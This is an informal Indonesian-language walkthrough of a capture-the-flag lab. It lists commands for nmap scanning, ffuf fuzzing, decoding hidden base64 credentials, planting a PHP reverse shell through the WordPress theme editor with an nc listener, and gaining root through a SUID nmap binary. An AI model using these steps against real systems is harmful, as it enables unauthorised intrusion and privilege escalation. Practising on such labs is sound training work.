1. nmap scan : sudo nmap -sC -sV -p- ip -oN scan
2. 80 kebuka -> fuzz -> ffuf -w word.txt -u ip/FUZZ -of md -o fuzz -fw 18
3. /robots.txt kebuka -> buka /dic atau apa gitu -> isinya file gede -> lupain
-> sama coba buka file .txt nya di dir -> ada key disitu
4. buka hasil fuzz -> /license -> inspect dia dibawah gitu ke spasi spasi terus di base64
5. ke /login login pake itu -> ke apperance -> di editor di archive -> paste shell php disitu
6. terus buka /wp-content/themes/namatema/archive.php -> jan lupa ganti ip port di shell nya  sama nyalain nc
7. masuk shell instal pty python biar enak -> ke /home/user -> cat semua disitu -> hash md5 
-> disitu key kedua paste aja
8. su ganti robot -> nyari root -> find / -perm -u=s -type f 2>/dev/null -> disitu ada bin nmap -> ke gtfo bins 
9. cari terus dapet, nmap --interactive -> masukin !sh shell nmap nya -> jadi root ke /root
10. finish
